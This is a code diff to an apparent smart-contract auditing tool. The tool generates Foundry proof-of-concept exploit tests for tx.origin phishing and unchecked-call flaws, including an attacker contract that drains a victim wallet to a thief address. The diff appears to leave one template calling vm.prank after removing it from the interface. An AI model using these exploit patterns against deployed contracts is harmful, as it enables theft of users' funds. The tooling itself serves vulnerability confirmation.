@@ -32,6 +32,10 @@ class RedTeam:
         state.exploit_result = self.foundry.exploit(Path(state.workspace_path or state.project_path))
         state.exploit_artifact.execution = state.exploit_result
         state.exploit_confirmed = state.exploit_result.success
+        if state.exploit_result.exit_code == -1:
+            state.feedback.append("Red Team could not run Forge. Install Foundry and ensure `forge` is on PATH.")
+            state.final_verification_state = "execution_unavailable"
+            return state
         finding.status = FindingStatus.CONFIRMED if state.exploit_confirmed else FindingStatus.DISCARDED
         state.exploit_artifact.confirmed = state.exploit_confirmed
         return state
@@ -79,7 +83,7 @@ contract ExploitTest {{
 
 import "../{source_file}";
 
-interface Vm {{ function deal(address account, uint256 newBalance) external; function prank(address sender) external; }}
+interface Vm {{ function deal(address account, uint256 newBalance) external; function startPrank(address sender, address origin) external; function stopPrank() external; }}
 
 contract ExploitTest {{
     Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
@@ -93,6 +97,64 @@ contract ExploitTest {{
         vm.prank(attacker);
         treasury.sweep(payable(attacker));
         require(address(treasury).balance == 0, "unauthorized sweep was blocked");
+    }}
+}}
+'''
+        if finding_id == "heuristic-tx-origin":
+            return f'''pragma solidity ^0.8.20;
+
+import "../{source_file}";
+
+interface Vm {{ function deal(address account, uint256 newBalance) external; function startPrank(address sender, address origin) external; function stopPrank() external; }}
+
+contract PhishingAttacker {{
+    function trick(TxOriginWallet wallet, address payable recipient) external {{ wallet.withdraw(recipient); }}
+}}
+
+contract ExploitTest {{
+    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
+    TxOriginWallet private wallet;
+    PhishingAttacker private attacker;
+    address private constant owner = address(0xB0B);
+    address private constant thief = address(0xA11CE);
+    function setUp() public {{
+        vm.deal(owner, 1 ether);
+        vm.startPrank(owner, owner);
+        wallet = new TxOriginWallet{{value: 1 ether}}();
+        vm.stopPrank();
+        attacker = new PhishingAttacker();
+    }}
+    function testExploit() public {{
+        vm.startPrank(owner, owner);
+        attacker.trick(wallet, payable(thief));
+        vm.stopPrank();
+        require(address(wallet).balance == 0, "tx.origin phishing was blocked");
+    }}
+}}
+'''
+        if finding_id == "heuristic-unchecked-call":
+            return f'''pragma solidity ^0.8.20;
+
+import "../{source_file}";
+
+interface Vm {{ function deal(address account, uint256 newBalance) external; }}
+
+contract RejectingRecipient {{ receive() external payable {{ revert("reject payment"); }} }}
+
+contract ExploitTest {{
+    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
+    UncheckedCallWallet private wallet;
+    RejectingRecipient private recipient;
+    function setUp() public {{
+        vm.deal(address(this), 1 ether);
+        wallet = new UncheckedCallWallet();
+        recipient = new RejectingRecipient();
+    }}
+    function testExploit() public {{
+        wallet.deposit{{value: 1 ether}}();
+        wallet.withdraw(payable(address(recipient)));
+        require(wallet.balances(address(this)) == 0, "unchecked call did not lose accounting credit");
+        require(address(wallet).balance == 1 ether, "recipient unexpectedly received funds");
     }}
 }}
 '''
